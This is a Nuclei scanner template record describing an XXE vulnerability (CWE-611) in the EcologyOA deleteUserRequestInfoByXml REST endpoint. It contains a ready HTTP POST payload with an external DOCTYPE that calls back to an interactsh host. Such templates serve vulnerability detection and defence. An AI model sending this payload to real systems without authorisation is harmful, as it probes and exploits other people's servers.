# Nuclei Template: EcologyOA deleteUserRequestInfoByXml - XML External Entity Injection
**Template ID:** ecology-oa-byxml-xxe
**Vulnerability Class:** XML External Entities (XXE)
**Severity:** High
**CWE:** CWE-611
**Source:** Nuclei Template (`ecology-oa-byxml-xxe.yaml`)

## Vulnerability Information & PoC

## Description
EcologyOA deleteUserRequestInfoByXml interface has XXE

## Steps to reproduce / Exploit Payload
```http
POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1
Host: {{Hostname}}
Content-Type: application/xml
Accept-Encoding: gzip

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE syscode SYSTEM "http://{{interactsh-url}}">
<M><syscode>&send;</syscode></M>
```

